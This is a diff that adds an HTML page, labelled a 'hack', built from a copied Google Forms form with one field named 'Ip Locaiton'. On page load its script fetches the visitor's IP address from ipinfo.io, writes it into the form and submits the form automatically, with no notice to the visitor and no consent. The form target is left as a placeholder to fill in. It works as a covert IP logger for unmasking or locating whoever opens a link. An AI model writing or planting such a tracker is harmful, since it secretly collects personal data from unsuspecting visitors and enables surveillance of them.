@@ -1,0 +1,43 @@
+<!--A McCormack hack-->
+
+<!-- put form code here-->
+
+
+<div class="ss-form"><form action="id" method="POST" id="ss-form" target="_self" onsubmit=""><ol role="list" class="ss-question-list" style="padding-left: 0">
+<div class="ss-form-question errorbox-good" role="listitem">
+<div dir="auto" class="ss-item  ss-text"><div class="ss-form-entry">
+<label class="ss-q-item-label" for="entry_1506783024"><div class="ss-q-title">Ip Locaiton:
+</div>
+<div class="ss-q-help ss-secondary-text" dir="auto"></div></label>
+<input type="text" name="entry.1506783024" value="" class="ss-q-short" id="entry_1506783024" dir="auto" aria-label="Ip Locaiton:  " title="">
+<div class="error-message" id="1698825305_errorMessage"></div>
+<div class="required-message">This is a required question</div>
+</div></div></div>
+<input type="hidden" name="draftResponse" value="[,,&quot;-4123067765190152788&quot;]
+">
+<input type="hidden" name="pageHistory" value="0">
+
+<input type="hidden" name="fvv" value="0">
+
+
+<input type="hidden" name="fbzx" value="-4123067765190152788">
+
+<div class="ss-item ss-navigate"><table id="navigation-table"><tbody><tr><td class="ss-form-entry goog-inline-block" id="navigation-buttons" dir="ltr">
+<input type="submit" name="submit" value="Submit" id="ss-submit" class="jfk-button jfk-button-action ">
+<div class="ss-password-warning ss-secondary-text">Never submit passwords through Google Forms.</div></td>
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+      <script>
+
+      $.get("http://ipinfo.io", function(response) {
+        document.getElementById('entry_1506783024').value=response.ip;
+        document.getElementById('ss-submit').click();
+      }, "jsonp");
+
+
+
+      </script>
